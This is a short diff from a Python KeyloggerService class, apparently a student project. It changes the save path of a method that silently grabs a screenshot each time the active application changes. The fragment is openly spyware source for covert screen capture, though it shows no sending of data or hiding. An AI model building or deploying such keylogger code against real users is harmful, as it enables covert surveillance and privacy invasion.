@@ -42,7 +42,7 @@ class KeyloggerService:
     def current_screenshot(self):
         if [self.prev_up] != [self.current_app]:
             screen_shot = ImageGrab.grab()
-            path = rF"C:\Users\1\פרוייקט סיום קודקוד\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+            path = rF"C:\Users\inon1\PycharmProjects\picture_key_logger-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
             screen_shot.save(path)
             self.prev_up = self.current_app
 
